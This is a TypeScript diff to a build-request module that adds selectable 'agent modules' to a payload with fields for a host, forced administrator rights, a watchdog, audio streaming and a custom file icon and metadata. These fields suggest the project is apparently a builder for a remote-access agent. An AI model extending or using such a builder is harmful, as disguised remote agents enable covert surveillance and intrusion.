@@ -6,7 +6,8 @@ import {
 	type HeaderKV
 } from './constants.js';
 import { parseListInput, sanitizeFileInformation, toIsoDateTime } from './utils.js';
-import type { BuildRequest } from '../../../../../shared/types/build';
+import { agentModuleIds, agentModules } from '../../../../../../shared/modules/index.js';
+import type { BuildRequest } from '../../../../../../shared/types/build';
 
 export type BuildRequestInput = {
 	host: string;
@@ -41,10 +42,11 @@ export type BuildRequestInput = {
 	executionRequireInternet: boolean;
 	audioStreamingTouched: boolean;
 	audioStreamingEnabled: boolean;
-	fileIconName: string | null;
-	fileIconData: string | null;
-	fileInformation: Record<string, string>;
-	isWindowsTarget: boolean;
+        fileIconName: string | null;
+        fileIconData: string | null;
+        fileInformation: Record<string, string>;
+        isWindowsTarget: boolean;
+        modules?: string[];
 };
 
 export type BuildRequestResult =
@@ -60,9 +62,44 @@ function sanitizeHeaders(headers: HeaderKV[]): HeaderKV[] {
 }
 
 function sanitizeCookies(cookies: CookieKV[]): CookieKV[] {
-	return cookies
-		.map((cookie) => ({ name: cookie.name.trim(), value: cookie.value.trim() }))
-		.filter((cookie) => cookie.name !== '' && cookie.value !== '');
+        return cookies
+                .map((cookie) => ({ name: cookie.name.trim(), value: cookie.value.trim() }))
+                .filter((cookie) => cookie.name !== '' && cookie.value !== '');
+}
+
+const MODULE_ORDER = new Map<string, number>(
+        agentModules.map((module, index) => [module.id, index])
+);
+
+function sanitizeModules(modules: string[]): string[] {
+        if (!Array.isArray(modules)) {
+                return [];
+        }
+
+        const sanitized: string[] = [];
+        const seen = new Set<string>();
+
+        for (const moduleId of modules) {
+                if (typeof moduleId !== 'string') {
+                        continue;
+                }
+                const trimmed = moduleId.trim();
+                if (!trimmed || seen.has(trimmed) || !agentModuleIds.has(trimmed)) {
+                        continue;
+                }
+                seen.add(trimmed);
+                sanitized.push(trimmed);
+        }
+
+        if (sanitized.length <= 1) {
+                return sanitized;
+        }
+
+        return sanitized.sort((left, right) => {
+                const leftIndex = MODULE_ORDER.get(left) ?? Number.MAX_SAFE_INTEGER;
+                const rightIndex = MODULE_ORDER.get(right) ?? Number.MAX_SAFE_INTEGER;
+                return leftIndex - rightIndex;
+        });
 }
 
 export function prepareBuildRequest(input: BuildRequestInput): BuildRequestResult {
@@ -213,8 +250,9 @@ export function prepareBuildRequest(input: BuildRequestInput): BuildRequestResul
 		}
 	}
 
-	const sanitizedHeaders = sanitizeHeaders(input.customHeaders);
-	const sanitizedCookies = sanitizeCookies(input.customCookies);
+        const sanitizedHeaders = sanitizeHeaders(input.customHeaders);
+        const sanitizedCookies = sanitizeCookies(input.customCookies);
+        const sanitizedModules = sanitizeModules(input.modules ?? []);
 
 	const payload: BuildRequest = {
 		host: trimmedHost,
@@ -232,9 +270,13 @@ export function prepareBuildRequest(input: BuildRequestInput): BuildRequestResul
 		forceAdmin: input.forceAdmin
 	};
 
-	if (input.audioStreamingTouched) {
-		payload.audio = { streaming: input.audioStreamingEnabled };
-	}
+        if (input.modules !== undefined) {
+                payload.modules = sanitizedModules;
+        }
+
+        if (input.audioStreamingTouched) {
+                payload.audio = { streaming: input.audioStreamingEnabled };
+        }
 
 	if (watchdogIntervalValue !== null) {
 		payload.watchdog = {
@@ -325,5 +367,5 @@ export function prepareBuildRequest(input: BuildRequestInput): BuildRequestResul
 		}
 	}
 
-	return { ok: true, payload, warnings };
+        return { ok: true, payload, warnings };
 }
